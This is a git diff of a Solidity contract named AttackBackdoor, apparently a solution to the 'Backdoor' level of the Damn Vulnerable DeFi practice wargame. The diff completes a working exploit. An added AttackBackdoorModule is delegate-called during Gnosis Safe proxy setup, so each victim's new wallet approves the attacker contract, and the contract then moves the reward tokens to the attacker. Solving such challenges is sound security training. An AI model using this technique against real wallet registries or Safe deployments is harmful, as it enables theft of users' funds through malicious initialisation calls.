@@ -1,6 +1,5 @@
 import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
 import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
-import "hardhat/console.sol";
 
 
 import "../DamnValuableToken.sol";
@@ -20,22 +19,27 @@ contract AttackBackdoor {
         address _token,
         address[] memory users
     ) {
+        // Setup vars
         owner = _owner;
         factory = _factory;
         masterCopy = _masterCopy;
         walletRegistry = _walletRegistry;
         token = _token;
 
-        string memory setupTokenSignature = "approve(address,uint256)";
+        // Deploy module contract (this is required as it will be delegate called
+        // so we cannot call the token contract directly.)
+        AttackBackdoorModule abm = new AttackBackdoorModule();
+
+        // Setup module setup data
+        string memory setupTokenSignature = "approve(address,address,uint256)";
         bytes memory setupData = abi.encodeWithSignature(
             setupTokenSignature,
             address(this),
+            address(token),
             10 ether
             );
 
-        console.logBytes(setupData);
-        // return;
-
+        // Loop each user
         for (uint256 i = 0; i < users.length; i++) {
             // Need to create a dynamically sized array for the user to meet signature req's
             address user = users[i];
@@ -49,14 +53,15 @@ contract AttackBackdoor {
                 signatureString,
                 victim,
                 uint256(1),
-                token,
+                address(abm),
                 setupData,
                 address(0),
                 address(0),
                 uint256(0),
                 address(0)
             );
-
+            
+            // Deploy the proxy with all the exploit data in initGnosis
             GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                 .createProxyWithCallback(
                     masterCopy,
@@ -64,8 +69,9 @@ contract AttackBackdoor {
                     123,
                     IProxyCreationCallback(walletRegistry)
                 );
-            
-            console.log(DamnValuableToken(token).allowance(address(newProxy), address(this))); 
+
+            // Proxy has approved this contract for transfer in the
+            // module setup so we should be able to transfer some ETH
             DamnValuableToken(token).transferFrom(
                 address(newProxy),
                 owner,
@@ -73,14 +79,13 @@ contract AttackBackdoor {
             );
         }
     }
+}
 
-    function setupToken(address _tokenAddress, address _attacker) external {
-        console.log("hi!");
-        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
+// Backdoor module contract that has to be deployed seperately so 
+// 1. It is able to called since the above contract's constructor is not complete
+// 2. It is delegate called so we cannot call the token approval directly.
+contract AttackBackdoorModule {
+    function approve(address approvalAddress, address token, uint256 amount) public {
+        DamnValuableToken(token).approve(approvalAddress, amount);
     }
-
-    
-    // function exploit() external {
-        
-    // }
 }
